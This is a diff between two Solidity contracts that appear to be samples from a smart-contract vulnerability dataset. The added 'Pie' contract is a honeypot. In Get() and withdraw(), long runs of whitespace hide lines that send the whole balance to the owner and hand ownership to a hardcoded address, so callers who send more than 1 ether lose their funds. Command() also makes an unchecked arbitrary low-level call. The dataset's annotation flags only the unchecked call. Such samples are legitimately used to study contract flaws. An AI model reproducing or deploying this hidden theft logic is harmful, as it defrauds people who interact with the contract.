@@ -1,42 +1,46 @@
 /*
  * @source: etherscan.io 
  * @author: -
- * @vulnerable_at_lines: 14
+ * @vulnerable_at_lines: 44
  */
 
-pragma solidity ^0.4.24;
+pragma solidity ^0.4.19;
 
-contract Proxy  {
-    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
-    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
-    function proxy(address target, bytes data) public payable {
+contract Pie
+{
+    address public Owner = msg.sender;
+   
+    function()
+    public
+    payable
+    {
+        
+    }
+   
+    function Get()
+    public
+    payable
+    {                                                                    
+        if(msg.value>1 ether)
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+            msg.sender.transfer(this.balance);
+        }                                                                                                                
+    }
+    
+    function withdraw()
+    payable
+    public
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+    
+    function Command(address adr,bytes data)
+    payable
+    public
+    {
+        require(msg.sender == Owner);
         // <yes> <report> UNCHECKED_LL_CALLS
-        target.call.value(msg.value)(data);
-    }
-}
-
-contract VaultProxy is Proxy {
-    address public Owner;
-    mapping (address => uint256) public Deposits;
-
-    function () public payable { }
-    
-    function Vault() public payable {
-        if (msg.sender == tx.origin) {
-            Owner = msg.sender;
-            deposit();
-        }
-    }
-    
-    function deposit() public payable {
-        if (msg.value > 0.5 ether) {
-            Deposits[msg.sender] += msg.value;
-        }
-    }
-    
-    function withdraw(uint256 amount) public onlyOwner {
-        if (amount>0 && Deposits[msg.sender]>=amount) {
-            msg.sender.transfer(amount);
-        }
+        adr.call.value(msg.value)(data);
     }
 }
